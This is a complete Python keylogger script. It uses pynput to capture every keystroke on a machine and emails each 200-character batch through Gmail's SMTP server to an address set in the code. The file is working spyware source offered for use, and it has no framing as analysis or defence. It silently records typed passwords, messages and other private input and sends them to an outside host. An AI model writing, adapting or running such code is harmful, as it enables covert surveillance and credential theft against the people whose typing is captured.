from pynput.keyboard import Listener
from smtplib import SMTP
import time


mailAdress = "mail@adress.com"  #Change here
passwd     = "password"         #Change here
sendTo     = mailAdress

karakter = 200                   
log_file = ""

def sendMail(mailAdress, passwd, sendTo, keylogger):
    #Mail bilgileri
    subject = "Log"
    message = "Here you are \n\n{0}".format(keylogger)
    content = "Subject: {0}\n\n{1}".format(subject,message)

    mail = SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login(mailAdress,passwd)
    
    mail.sendmail(mailAdress, sendTo, content.encode("utf-8"))


def log_keystroke(key):
    global log_file

    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if "Key" in key:
        key = " {0} ".format(key)
    
    log_file += key

    if len(log_file) >= karakter:
        sendMail(mailAdress,passwd,sendTo,log_file)
        log_file = ""

with Listener(on_press=log_keystroke) as l:
    l.join()